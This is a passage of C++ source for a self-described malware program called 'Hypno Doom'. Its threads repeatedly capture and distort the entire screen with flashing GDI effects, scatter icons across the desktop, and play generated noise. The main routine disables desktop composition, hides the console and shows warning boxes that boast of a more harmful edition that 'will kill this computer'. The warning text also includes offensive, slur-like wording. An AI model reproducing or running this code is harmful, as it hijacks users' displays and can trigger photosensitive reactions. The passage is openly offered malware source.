    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x * y ^ (x + w * y);
                rgbquad[x + w * y].rgb += x * (1599 + "NoN17"[x % 5]) + 890 * y;
            }
        }
        for (int i = 0; i < 5; i++) {
            int rrr = rand() % h, rr2 = rand() % h;
            BitBlt(hcdc, rand() % 3 - 1, rrr, w, rr2, hcdc, 0, rrr, SRCPAINT);
        }
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 128;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc, rand() % 20 - 10, rand() % 20 - 10, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader18(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 77 - x + 5 & y | 5 + x;
                rgbquad[x + w * y].r /= 2;
                rgbquad[x + w * y].g /= 2;
            }
        }
        for (int i = 0; i < 5; i++) {
            int rrr = rand() % h, rr2 = rand() % h;
            BitBlt(hcdc, rand() % 3 - 1, rrr, w, rr2, hcdc, 0, rrr, SRCPAINT);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader19(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 50) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += "uiui"[x % 4] + "uiui"[y % 4] + x | y;
            }
        }
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 128;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc, -30 + 100 * cos(t * PI / 180.f), 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI Shader20(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 50) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 1;
            }
        }
        BitBlt(hdc, rand() % 3 - 1, rand() % 3 - 1, w, h, hcdc, 0, 0, rand() % 2 ? SRCAND : SRCPAINT);
        rand() % 2 ? BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY) : 0;
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI FH1(LPVOID) {
    for (;;) {
        int size = 32 + rand() % 118;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HICON ico = LoadIcon(0, lpIconNames[rand() % 6]);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, size, size, NULL, NULL, DI_NORMAL);
        DestroyIcon(ico);
        ico = LoadCursor(0, lpCursorNames[rand() % 16]);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, size, size, NULL, NULL, DI_NORMAL);
        DestroyIcon(ico);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI FH2(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int xf = 0, yf = 0;
    int signX = 15, signY = 5;
    int signX1 = 1, signY1 = 1, incrementor = 10, radius = 100.0f;
    double angle = 0;
    int x, y;
    int centerX, centerY;
    int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
    while (1) {
        HDC hdc = GetDC(0);
        xf += signX;
        yf += signY;
        centerX = origX - (w / 4), centerY = origY - (h / 4);
        x = (sin(angle) * radius) + centerX, y = (cos(angle) * radius) + centerY;
        for (INT i = 64; i > 8; i -= 8) {
            DrawIconEx(hdc, (50 + x - i + xf) - 128, (50 + y - i + yf) - 128, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1)), 128, 128, 0, NULL, DI_NORMAL);
        }
        angle = fmod(angle + PI / radius, PI * radius);
        if (yf == 0)
            signY = 5;
        if (xf == 0)
            signX = 15;
        if (yf >= GetSystemMetrics(1))
            signY -= 5;
        if (xf >= GetSystemMetrics(0))
            signX -= 15;
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}
DWORD WINAPI FH3(LPVOID) {
    int x = 0, y = 0;
    int signX = 10, signY = 10;
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        RECT r;
        GetWindowRect(Hypno_Doom_Icon_Msg, &r);
        int ww = r.right - r.left, wh = r.bottom - r.top;
        HBITMAP bmp = CreateCompatibleBitmap(hdc, ww, wh), old = (HBITMAP)SelectObject(hcdc, bmp);
        PrintWindow(Hypno_Doom_Icon_Msg, hcdc, 0);
        BitBlt(hdc, x, y, ww, wh, hcdc, 0, 0, SRCCOPY);
        if (x + ww >= w)signX = -10;
        if (y + wh >= h)signY = -10;
        if (x <= 0)signX = 10;
        if (y <= 0)signY = 10;
        x += signX; y += signY;
        SelectObject(hcdc, old); DeleteObject(bmp);
        ReleaseDC(0, hdc); DeleteDC(hcdc);
        Sleep(1);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 1) * (t >> 4) & t >> 4 * (t >> 6 * t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t ^ 20) | t * (t >> 5) & t * (t >> t & 7 * (t >> 5 | t >> 13)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(2 * (t >> 9 * (t >> 7 & t)) + (t >> 4 | 9) | t | t * (t >> 4) & ~t >> 6);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(4 * (t >> 5 & t) * t >> 4 * (t >> 3 | t >> (t >> 5 & t)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << 3 ^ t | (t >> 5 | t >> 3 * (t / 1023)) >> (t >> 4 & t >> 13) | t * rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5 & t >> 7 | t * 3 & t >> 10) ^ (t >> 5 | t >> 7 + (t / (1 + (t >> 6)))) ^ (t >> 4 | t >> 3 | t) ^ (t / 1000 ^ t) & 2 * (t >> 4 & t >> 1));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)tan(cos(t >> 4 * t | t >> 522 * t) * 2) * (t >> 7 + t) ^ (t >> 5) ^ (t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 & t) >> t & (1 - t % 30));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (2 * t >> 10 & t >> 4 & t) | ((t & t * 5) | (t & t >> 14)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (t / (8 + (t >> 11 & t)) & 1)) ? 128 : 0);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & t >> 12) * (t >> 5) * cos(t >> 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((int)6.5 * t & t >> 7 | (int)4.5 * t & t >> 6 | (int)5.5 * t & t >> 10) - rand() % 48);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 8 & t) * t / ("183abcfkshfkshdfjksdhf"[t >> 13 & 21]));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & t >> 11) * (t >> 6) - (t % 25));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(cos(t >> 3 * t | t >> 2 ^ (t >> 4 & t)) * tan(t >> 4 & t >> 7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32768, 32768, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32768 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t / 19) | (t / 12)) + (t >> 1));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t >> 8 + (t / 5)) - ((t >> 8) * (t >> 9)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(27 * (t + (t >> 9) & 400) | t >> 9);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t >> 1) + (t >> 2) * (t >> 5 | t >> 12) | t >> 5);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t * (t & 16384 ? 6 : 5) * (1 + (1 & t >> 1)) >> (1 & t >> 1) | t >> 8) & (t * (t & 16384 ? 6 : 5) * (4 - (3 & t >> 8)) >> (3 & (0 - t) >> (t & 4096 ? rand() % 10 : 15)))) - (t % 1));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void SPtime(int time = 30000) {
    Sleep(time);
}
void clean() {
    InvalidateRect(0, 0, 0);
    Sleep(100);
}
void stopThread(HANDLE hnd) {
    TerminateThread(hnd, 0);
    CloseHandle(hnd);
}
void runSP() {
    DwmEnableComposition(0);
    clean();
    HANDLE wnd0 = CreateThread(NULL, 0, Window0, NULL, 0, NULL);
    HANDLE fh1 = CreateThread(NULL, 0, FH1, NULL, 0, NULL);
    HANDLE fh2 = CreateThread(NULL, 0, FH2, NULL, 0, NULL);
    sound1();
    HANDLE sh1 = CreateThread(NULL, 0, Shader1, NULL, 0, NULL);
    SPtime();
    stopThread(sh1);
    clean();
    sound2();
    HANDLE sh2 = CreateThread(NULL, 0, Shader2, NULL, 0, NULL);
    HANDLE py2 = CreateThread(NULL, 0, Payload2, NULL, 0, NULL);
    SPtime();
    stopThread(sh2);
    stopThread(py2);
    clean();
    sound3();
    HANDLE sh3 = CreateThread(NULL, 0, Shader3, NULL, 0, NULL);
    SPtime();
    stopThread(sh3);
    clean();
    sound4();
    HANDLE sh4 = CreateThread(NULL, 0, Shader4, NULL, 0, NULL);
    HANDLE py4 = CreateThread(NULL, 0, Payload4, NULL, 0, NULL);
    SPtime();
    stopThread(sh4);
    stopThread(py4);
    clean();
    sound5();
    HANDLE sh5 = CreateThread(NULL, 0, Shader5, NULL, 0, NULL);
    SPtime();
    stopThread(sh5);
    clean();
    sound6();
    HANDLE sh6 = CreateThread(NULL, 0, Shader6, NULL, 0, NULL);
    SPtime();
    stopThread(sh6);
    clean();
    sound7();
    HANDLE sh7 = CreateThread(NULL, 0, Shader7, NULL, 0, NULL);
    SPtime();
    stopThread(sh7);
    clean();
    sound8();
    HANDLE sh8 = CreateThread(NULL, 0, Shader8, NULL, 0, NULL);
    HANDLE py8 = CreateThread(NULL, 0, Payload8, NULL, 0, NULL);
    SPtime();
    stopThread(sh8);
    stopThread(py8);
    clean();
    sound9();
    HANDLE sh9 = CreateThread(NULL, 0, Shader9, NULL, 0, NULL);
    SPtime();
    stopThread(sh9);
    stopThread(fh2);
    clean();
    sound10();
    HANDLE fh3 = CreateThread(NULL, 0, FH3, NULL, 0, NULL);
    HANDLE sh10 = CreateThread(NULL, 0, Shader10, NULL, 0, NULL);
    SPtime();
    stopThread(sh10);
    clean();
    sound11();
    HANDLE sh11 = CreateThread(NULL, 0, Shader11, NULL, 0, NULL);
    SPtime();
    stopThread(sh11);
    clean();
    sound12();
    HANDLE sh12 = CreateThread(NULL, 0, Shader12, NULL, 0, NULL);
    SPtime();
    stopThread(sh12);
    clean();
    sound13();
    HANDLE sh13 = CreateThread(NULL, 0, Shader13, NULL, 0, NULL);
    SPtime();
    stopThread(sh13);
    clean();
    sound14();
    HANDLE sh14 = CreateThread(NULL, 0, Shader14, NULL, 0, NULL);
    HANDLE py14 = CreateThread(NULL, 0, Payload14, NULL, 0, NULL);
    SPtime();
    stopThread(sh14);
    stopThread(py14);
    clean();
    sound15();
    HANDLE sh15 = CreateThread(NULL, 0, Shader15, NULL, 0, NULL);
    SPtime();
    stopThread(sh15);
    clean();
    sound16();
    HANDLE sh16 = CreateThread(NULL, 0, Shader16, NULL, 0, NULL);
    SPtime();
    stopThread(sh16);
    clean();
    sound17();
    HANDLE sh17 = CreateThread(NULL, 0, Shader17, NULL, 0, NULL);
    SPtime();
    stopThread(sh17);
    clean();
    sound18();
    HANDLE sh18 = CreateThread(NULL, 0, Shader18, NULL, 0, NULL);
    SPtime();
    stopThread(sh18);
    clean();
    sound19();
    HANDLE sh19 = CreateThread(NULL, 0, Shader19, NULL, 0, NULL);
    SPtime();
    stopThread(sh19);
    clean();
    sound20();
    HANDLE sh20 = CreateThread(NULL, 0, Shader20, NULL, 0, NULL);
    SPtime();
    stopThread(sh20);
    stopThread(wnd0);
    stopThread(fh1);
    stopThread(fh3);
    clean();
}
int main() {
    SetProcessDPIAware();
    srand(time(NULL));
    FreeConsole();
    LPCWSTR MessageTextFirst = L"Doom!!!\n\nDo you want to run me??I am a malware!Please do not run my Harmfull edit on your important computer if you want to live.I AM NOT TALKING A JOKE!!THIS IS REAL.And I must tell you something is quite important:DO NOT run my Harmfull edit on PUBLIC OR IMPORTANT COMPUTER!!If you want run my Harmfull edit,you can run my Harmfull edit on VM or not important computer.DO NOT COPY MY CODE IF YOU DO NOT WANT TO BE A GAY AND KILL YOUR PARANTS!!!!!!\n\nby github@uiui-sod  bilibili@uiui-RuYiShiQu";
    LPCWSTR MessageTextSecond = L"Last warning\n\nWell you maybe still do not know what is happening,and I will tell you:You just run a malware(me),If you want to continue,click Yes button,else click No button.Malware is an APP,there has two edit,first is Harmfull,it will kill this computer,second is Harmless,it will not kill the system but little break the CPU.So,can you decide??";
    if (MessageBoxW(0, MessageTextFirst, L"Hypno Doom.exe-ready to destroy files", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
    else {
        if (MessageBoxW(0, MessageTextSecond, L"Hypno Doom.exe-ready to destroy files", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
        else {
            runSP();
        }
    }
    return 0;
}